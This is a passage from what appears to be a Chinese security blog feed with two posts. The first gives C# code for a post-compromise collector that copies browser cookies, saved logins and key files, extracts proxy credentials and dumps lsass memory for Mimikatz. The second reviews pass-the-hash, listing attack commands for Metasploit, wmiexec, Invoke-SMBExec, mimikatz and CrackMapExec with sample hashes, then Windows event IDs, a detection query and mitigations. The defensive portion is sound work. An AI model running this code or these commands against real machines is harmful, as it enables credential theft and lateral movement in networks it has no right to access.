class="keyword">string</span> recentsPath = Path.Combine(userPath, recents);</span><br><span class="line">            DirectoryInfo di = <span class="keyword">new</span> DirectoryInfo(recentsPath);</span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] Recent Items in " + recentsPath);</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> file <span class="keyword">in</span> di.GetFiles())</span><br><span class="line">            &#123;</span><br><span class="line">                TxtWriter(file.Name, <span class="string">"最近预览的文件"</span>);</span><br><span class="line">                <span class="comment">//Console.WriteLine("\t[*] " + file.Name);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="7-网络代理信息"><a href="#7-网络代理信息" class="headerlink" title="7) 网络代理信息"></a>7) 网络代理信息</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetProxyInformation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - GetSystemWebProxy() 返回使用当前模拟用户的 Internet Explorer 设置配置的代理</span></span><br><span class="line"><span class="comment">             * - 使用代理访问 google.com 进行确认</span></span><br><span class="line"><span class="comment">             * - 如果存在验证情况，则将相关信息进行输出</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            IWebProxy wp = WebRequest.GetSystemWebProxy();</span><br><span class="line">            <span class="keyword">string</span> url = <span class="string">"https://www.google.com"</span>;</span><br><span class="line">            Uri req = <span class="keyword">new</span> Uri(url);</span><br><span class="line">            <span class="comment">//Console.Out.WriteLine("[+] URL Requested: " + req.AbsoluteUri);</span></span><br><span class="line">            Uri proxy = wp.GetProxy(req);</span><br><span class="line">            <span class="keyword">if</span> (String.Compare(req.AbsoluteUri, proxy.AbsoluteUri) != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//Console.Out.WriteLine("\t[*] Proxy: DIRECT");</span></span><br><span class="line">                TxtWriter(proxy.AbsoluteUri, <span class="string">"网络代理情况"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (wp.Credentials != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                NetworkCredential cred = wp.Credentials.GetCredential(req, <span class="string">"basic"</span>);</span><br><span class="line">                <span class="keyword">string</span>[] cerd = &#123; cred.UserName, cred.Password, cred.Domain &#125;;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">string</span> cers <span class="keyword">in</span> cerd)</span><br><span class="line">                &#123;</span><br><span class="line">                    TxtWriter(cers, <span class="string">"网络代理情况"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="8-浏览器相关文件"><a href="#8-浏览器相关文件" class="headerlink" title="8) 浏览器相关文件"></a>8) 浏览器相关文件</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 Chrome 相关</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> ChromeLocation()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span> localAppData = Environment.GetEnvironmentVariable(<span class="string">"USERPROFILE"</span>);</span><br><span class="line">            <span class="keyword">string</span> ChromeBasePath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\AppData\\Local\\Google\\Chrome"</span>, localAppData);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">if</span> (Directory.Exists(ChromeBasePath))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取 Chrome 浏览器相关文件路径</span></span><br><span class="line">                <span class="keyword">string</span> ChromeHistoryPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\History"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span> ChromeBookmarkPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\Bookmarks"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span> ChromeCookiesPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\Cookies"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span> ChromeLoginDataPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\Login Data"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span>[] ChromePaths = &#123; ChromeHistoryPath, ChromeBookmarkPath, ChromeCookiesPath, ChromeLoginDataPath &#125;;</span><br><span class="line">                <span class="comment">// 创建文件夹、判断文件是否存在</span></span><br><span class="line">                <span class="keyword">string</span> FilePath = CreateBrowserDirectory(<span class="string">"\\Chrome"</span>);</span><br><span class="line">                foreach (<span class="keyword">string</span> filePath in ChromePaths)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">if</span> (<span class="built_in">File</span>.Exists(filePath))</span><br><span class="line">                    &#123;</span><br><span class="line">                        var FileName = filePath.Substring(filePath.LastIndexOf(<span class="string">'\\'</span>));</span><br><span class="line">                        <span class="built_in">File</span>.Copy(filePath, FilePath + FileName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Console</span>.WriteLine(<span class="string">"[+] Not Chrome Directory"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取 Friefox 相关</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> FroefoxLocation()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取 Friefox 浏览器目录</span></span><br><span class="line">            <span class="keyword">string</span> localAppData = Environment.GetEnvironmentVariable(<span class="string">"USERPROFILE"</span>);</span><br><span class="line">            <span class="keyword">string</span> FirefoxBasePath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"</span>, localAppData);</span><br><span class="line">            <span class="built_in">if</span> (Directory.Exists(FirefoxBasePath))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取 Friefox 浏览器相关文件路径</span></span><br><span class="line">                <span class="keyword">string</span>[] directories = Directory.GetDirectories(FirefoxBasePath);</span><br><span class="line">                foreach (<span class="keyword">string</span> directory in directories)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">string</span> FirefoxPlaces = <span class="keyword">string</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"places.sqlite"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxCer_1 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"cert8.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxCer_2 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"cert9.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxKey_1 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"key3.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxKey_2 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"key4.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxLogon = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"logins.json"</span>);</span><br><span class="line">                    <span class="keyword">string</span>[] FirefoxPaths = &#123; FirefoxPlaces, FirefoxCer_1, FirefoxCer_2, FirefoxKey_1, FirefoxKey_2, FirefoxLogon &#125;;</span><br><span class="line">                    <span class="comment">// 创建文件夹、判断文件是否存在</span></span><br><span class="line">                    <span class="keyword">string</span> FilePath = CreateBrowserDirectory(<span class="string">"\\Friefox"</span>);</span><br><span class="line">                    foreach (<span class="keyword">string</span> filePath in FirefoxPaths)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">if</span> (<span class="built_in">File</span>.Exists(filePath))</span><br><span class="line">                        &#123;</span><br><span class="line">                            var FileName = filePath.Substring(filePath.LastIndexOf(<span class="string">'\\'</span>));</span><br><span class="line">                            <span class="built_in">File</span>.Copy(filePath, FilePath + FileName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Console</span>.WriteLine(<span class="string">"[+] Not Friefox Directory"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="9-MiniDump"><a href="#9-MiniDump" class="headerlink" title="9) MiniDump"></a>9) MiniDump</h3><p>直接取用<code>SharpDump</code>，需要高权限</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">DllImport(<span class="meta-string">"dbghelp.dll"</span>, EntryPoint = <span class="meta-string">"MiniDumpWriteDump"</span>, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)</span>]</span><br><span class="line">      <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">MiniDumpWriteDump</span>(<span class="params">IntPtr hProcess, <span class="keyword">uint</span> processId, SafeHandle hFile, <span class="keyword">uint</span> dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam</span>)</span>;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Minidump</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>      &#123;</span><br><span class="line">          IntPtr targetProcessHandle = IntPtr.Zero;</span><br><span class="line">          <span class="keyword">uint</span> targetProcessId = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          Process targetProcess = <span class="literal">null</span>;</span><br><span class="line">          Process[] processes = Process.GetProcessesByName(<span class="string">"lsass"</span>);</span><br><span class="line">          targetProcess = processes[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">try</span></span><br><span class="line">          &#123;</span><br><span class="line">              targetProcessId = (<span class="keyword">uint</span>)targetProcess.Id;</span><br><span class="line">              targetProcessHandle = targetProcess.Handle;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">          &#123;</span><br><span class="line">              Console.WriteLine(String.Format(<span class="string">"\n[X] Error getting handle to &#123;0&#125; (&#123;1&#125;): &#123;2&#125;\n"</span>, targetProcess.ProcessName, targetProcess.Id, ex.Message));</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">bool</span> bRet = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">string</span> dumpDir = Program.CreateDirectory();</span><br><span class="line">          <span class="keyword">string</span> dumpFile = String.Format(<span class="string">"&#123;0&#125;\\lsass_pid-&#123;1&#125;.dmp"</span>, dumpDir, targetProcessId);</span><br><span class="line">          <span class="comment">//string zipFile = String.Format("&#123;0&#125;\\lsass_pid&#123;1&#125;.bin", dumpDir, targetProcessId);</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">//Console.WriteLine(String.Format("\n[*] Dumping &#123;0&#125; (&#123;1&#125;) to &#123;2&#125;", targetProcess.ProcessName, targetProcess.Id, dumpFile));</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">using</span> (FileStream fs = <span class="keyword">new</span> FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))</span><br><span class="line">          &#123;</span><br><span class="line">              bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (<span class="keyword">uint</span>)<span class="number">2</span>, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="10-文件夹压缩加密"><a href="#10-文件夹压缩加密" class="headerlink" title="10) 文件夹压缩加密"></a>10) 文件夹压缩加密</h3><p><code>AES</code> 加密</p><h2 id="0x02-信息解析模块"><a href="#0x02-信息解析模块" class="headerlink" title="0x02 信息解析模块"></a>0x02 信息解析模块</h2><p> 本文所缺失的相关代码，下步更新放出。</p><h3 id="1-压缩包解密"><a href="#1-压缩包解密" class="headerlink" title="1) 压缩包解密"></a>1) 压缩包解密</h3><p><code>AES</code> 解密</p><h3 id="2-MiniDump"><a href="#2-MiniDump" class="headerlink" title="2) MiniDump"></a>2) MiniDump</h3><p>利用 <code>subtee</code> 的 <code>PELoader</code> 加载 <code>Mimikatz</code> 的自定义版本，加载 <code>minidump</code> 文件，运行 <code>sekurlsa :: logonpasswords</code> 和 <code>sekurlsa::ekeys</code></p><h3 id="3-浏览器相关"><a href="#3-浏览器相关" class="headerlink" title="3) 浏览器相关"></a>3) 浏览器相关</h3><p>解析相关 <code>sqlite</code> 文件</p><p>解析密码文件</p><h2 id="0x03-整合的相关项目列表"><a href="#0x03-整合的相关项目列表" class="headerlink" title="0x03 整合的相关项目列表"></a>0x03 整合的相关项目列表</h2><p><a href="https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/AVQuery.cna" target="_blank" rel="noopener">AVQuery.cna</a></p><p><a href="https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/EDR.cna" target="_blank" rel="noopener">EDR.cna</a></p><p><a href="https://github.com/secgroundzero/SharpAttack" target="_blank" rel="noopener">SharpAttack</a></p><p><a href="https://github.com/GhostPack/SafetyKatz" target="_blank" rel="noopener">SafetyKatz</a></p><p>这类型的开源项目，完全可以从中拓展，改写成适合自己的工具。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="编程之道" scheme="https://rcoil.me/tags/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>Pass The Hash [ 知识回顾 ]</title>
    <link href="https://rcoil.me/2019/04/Pass%20The%20Hash/"/>
    <id>https://rcoil.me/2019/04/Pass The Hash/</id>
    <published>2019-04-04T03:14:38.000Z</published>
    <updated>2019-04-10T06:30:07.028Z</updated>
    
    <content type="html"><![CDATA[<p>这个<strong>[ 知识回顾 ]</strong>系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在横向移动中，无论是域环境还是工作组环境，hash传递常用于在获取用户hash凭证后，且在不破解的情况下，重新使用它来欺骗身份验证系统在同一网络上创建新的经过身份验证的会话。</p><h1 id="0x01-Pass-The-Hash的原理"><a href="#0x01-Pass-The-Hash的原理" class="headerlink" title="0x01  Pass The Hash的原理"></a>0x01  Pass The Hash的原理</h1><ul><li>在windows系统中，通常会使用<code>NTLM身份认证</code>。</li><li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li><li>NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限，它只是在身份验证的时候绕过了用户必须输入口令的那一步。</li><li>这个不是漏洞。</li></ul><h1 id="0x02-常用攻击方式"><a href="#0x02-常用攻击方式" class="headerlink" title="0x02 常用攻击方式"></a>0x02 常用攻击方式</h1><ul><li><p><strong>meterpreter</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">smb</span>/<span class="title">psexec_psh</span></span><br></pre></td></tr></table></figure></li><li><p><strong>wmiexec</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes e6db7544d2c6d325ca3b108f3faa626d:<span class="number">5</span>a625b04e786347908fc5f5d8a26dad5(LMHASH:NTHASH) rcoil/john@<span class="number">192.10</span><span class="number">.20</span><span class="number">.22</span> <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure></li><li><p><strong>Invoke-WMIExec</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target <span class="number">192.10</span>.<span class="number">20.22</span> -Domain rcoil.org -Username john -Hash <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -Command <span class="string">"calc.exe"</span> -verbose</span><br></pre></td></tr></table></figure></li><li><p><strong>Invoke-SMBExec</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target <span class="number">192.10</span>.<span class="number">20.22</span> -Domain rcoil.org -Username john -Hash <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -Command <span class="string">"calc.exe"</span> -verbose</span><br></pre></td></tr></table></figure></li><li><p><strong>mimikatz</strong>（Overpass-the-hash）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege：：debug</span><br><span class="line">sekurlsa::pth /user:john /domain:rcoil.org /ntlm:<span class="number">5</span>a625b04e786347908fc5f5d8a26dad5</span><br></pre></td></tr></table></figure></li><li><p><strong>CrackMapExec</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">192.10</span><span class="number">.20</span><span class="number">.22</span> -u john -H <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -x whoami</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x03-如何检测"><a href="#0x03-如何检测" class="headerlink" title="0x03 如何检测"></a>0x03 如何检测</h1><p>由于Hash传递的结果为有效身份验证，因此建议检测查看涉及到的身份验证日志以确定正常用户行为与异常用户行为。这可能需要大量的数据分析，且可能导致许多误报的调查结果。</p><h2 id="1）-工作组日志事件"><a href="#1）-工作组日志事件" class="headerlink" title="1） 工作组日志事件"></a>1） 工作组日志事件</h2><ul><li><p>产生NTLM身份验证</p><p><img src="/image/Pass The Hash/blog_2019-04-03_15-47-55.png" alt="blog_2019-04-04_15-47-55.png"></p></li><li><p><strong>日志ID 4648 查看登录信息</strong></p><p><img src="/image/Pass The Hash/blog_2019-04-03_16-08-45.png" alt="blog_2019-04-03_16-08-45.png"></p><p>显示账户已经成功登陆</p></li><li><p><strong>日志ID 4624 所有用户登录事件</strong></p><p><img src="/image/Pass The Hash/blog_2019-04-03_16-12-14.png" alt="blog_2019-04-03_16-12-14.png"></p></li></ul><p>  在4624事件中，登陆类型为2，表示是一个交互式登陆。这符合使用runas登陆的方式。</p><ul><li><p><strong>日志ID 4672 分配给新登录的特权</strong></p><p><img src="/image/Pass The Hash/blog_2019-04-03_16-19-27.png" alt="blog_2019-04-03_16-19-27.png"></p></li><li><p><strong>SQLServer 机器</strong></p><p>在<code>192.168.1.104</code>机器上查看，在<code>4624事件</code>上能明确看到登陆类型为3，即网络登陆。且登陆<code>身份验证数据包</code>为NTLM。我们还将看到4672事件，因为我们利用的用户帐户是特权帐户</p></li></ul><h2 id="2）-域控日志事件"><a href="#2）-域控日志事件" class="headerlink" title="2） 域控日志事件"></a>2） 域控日志事件</h2><p>以下是我们在不使用pass-the-hash执行NTLM身份验证时看到的日志摘要。这为我们提供了正常行为的基线。</p><table><thead><tr><th><strong>Source Host</strong></th><th><strong>Target Host</strong></th><th><strong>Domain Controller</strong></th></tr></thead><tbody><tr><td>4648 - 使用显式凭据尝试登录</td><td>4624 - 帐户已成功登录。登录类型3，NTLM</td><td>4768 - 请求了Kerberos身份验证票证（TGT）</td></tr><tr><td>4624 - 帐户已成功登录。登录类型2</td><td>4672 - 分配给新登录的特权</td><td>4769 - 请求了Kerberos服务票证</td></tr><tr><td>4672 - 分配给新登录的特权</td><td></td><td>4776 - 计算机尝试验证帐户的凭据</td></tr></tbody></table><p>接下来看看<code>Pass The Hash</code>所产生的日志事件</p><h2 id="3）Pass-The-Hash事件"><a href="#3）Pass-The-Hash事件" class="headerlink" title="3）Pass The Hash事件"></a>3）Pass The Hash事件</h2><p>以下是我们在使用<code>Pass-The-Hash</code>执行NTLM身份验证时看到的日志摘要。</p><table><thead><tr><th><strong>Source Host</strong></th><th><strong>Target Host</strong></th><th><strong>Domain Controller</strong></th></tr></thead><tbody><tr><td>4648 - 使用显式凭据尝试登录</td><td>4624 - 帐户已成功登录。登录类型3，NTLM</td><td>4776 - 计算机尝试验证帐户的凭据</td></tr><tr><td>4624 - 帐户已成功登录 <strong>（登录类型= 9 </strong>,<strong>登录过程= Seclogo</strong></td><td>4672 - 分配给新登录的特权</td><td></td></tr><tr><td>4672 - 分配给新登录的特权 <strong>（登录用户，而不是模拟用户）</strong></td><td></td></tr></tbody></table><p>自定义事件过滤器，可用于显示特定信息。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;QueryList&gt;</span><br><span class="line">  &lt;Query Id=<span class="string">"0"</span> Path=<span class="string">"Security"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">Select</span> Path=<span class="string">"Security"</span>&gt;</span><br><span class="line">     *[System[(EventID=<span class="string">'4624'</span>)]</span><br><span class="line">      <span class="literal">and</span></span><br><span class="line">     EventData[Data[<span class="symbol">@Name</span>=<span class="string">'LogonType'</span>]=<span class="string">'9'</span>]</span><br><span class="line">      <span class="literal">and</span></span><br><span class="line">     EventData[Data[<span class="symbol">@Name</span>=<span class="string">'LogonProcessName'</span>]=<span class="string">'seclogo'</span>]</span><br><span class="line">     <span class="literal">and</span></span><br><span class="line">     EventData[Data[<span class="symbol">@Name</span>=<span class="string">'AuthenticationPackageName'</span>]=<span class="string">'Negotiate'</span>]</span><br><span class="line">     ]</span><br><span class="line">     &lt;/<span class="keyword">Select</span>&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">  &lt;Query Id=<span class="string">"0"</span> Path=<span class="string">"Microsoft-Windows-Sysmon/Operational"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">Select</span> Path=<span class="string">"Microsoft-Windows-Sysmon/Operational"</span>&gt;</span><br><span class="line">    *[System[(EventID=<span class="number">10</span>)]]</span><br><span class="line">    <span class="literal">and</span></span><br><span class="line">    *[EventData[Data[<span class="symbol">@Name</span>=<span class="string">'GrantedAccess'</span>] <span class="literal">and</span> (Data=<span class="string">'0x1010'</span> <span class="literal">or</span> Data=<span class="string">'0x1038'</span>)]]</span><br><span class="line">&lt;/<span class="keyword">Select</span>&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">&lt;/QueryList&gt;</span><br></pre></td></tr></table></figure><p>以上日志事件可自行验证。</p><p>VB代码为：&lt;    <a href="https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt;" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt;</a></p><h2 id="4）-要想放心，还是得买买买"><a href="#4）-要想放心，还是得买买买" class="headerlink" title="4） 要想放心，还是得买买买"></a>4） 要想放心，还是得买买买</h2><p><a href="https://www.stealthbits.com/stealthdefend-product" target="_blank" rel="noopener">StealthDEFEND</a></p><p><a href="https://www.manageengine.com/products/active-directory-audit/index.html?ADAPID=101030&amp;kw=adaudit%20plus&amp;adId=7397729447&amp;gclid=CjwKCAjw-ZvlBRBbEiwANw9UWinKcfl0WJWvQu1HSdeSdhyNqxxJIGMNZ7DOoC0M_CGNX5zazdLDHxoCt8wQAvD_BwE" target="_blank" rel="noopener">Real-Time Auditing for Active Directory</a></p><p>略….</p><h2 id="5）蜜罐部署"><a href="#5）蜜罐部署" class="headerlink" title="5）蜜罐部署"></a>5）蜜罐部署</h2><p><a href="https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/" target="_blank" rel="noopener">https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/</a><br><a href="https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/" target="_blank" rel="noopener">https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/</a><br><a href="https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/" target="_blank" rel="noopener">https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/</a><br><a href="https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x" target="_blank" rel="noopener">https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x</a></p><p>略….</p><h1 id="0x04-缓解措施"><a href="#0x04-缓解措施" class="headerlink" title="0x04 缓解措施"></a>0x04 缓解措施</h1><ul><li>域管账户只能访问域控制器，且强调最少用户访问的概念。</li><li>域控制器与其余敏感系统只能从可信的脱网环境进行访问。</li><li>使用双因素身份验证。</li><li>监控身份验证与异常登陆活动相关日志。</li><li>启用LSA保护。</li><li><p>手动添加注册表，取消明文存储（<a href="https://blogs.technet.microsoft.com/srd/2014/06/05/an-overview-of-kb2871997/" target="_blank" rel="noopener">KB2871997</a>补丁）：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\S</span>ecurityProviders<span class="symbol">\W</span>Digest /v UseLogonCredential /t REG_DWORD /d 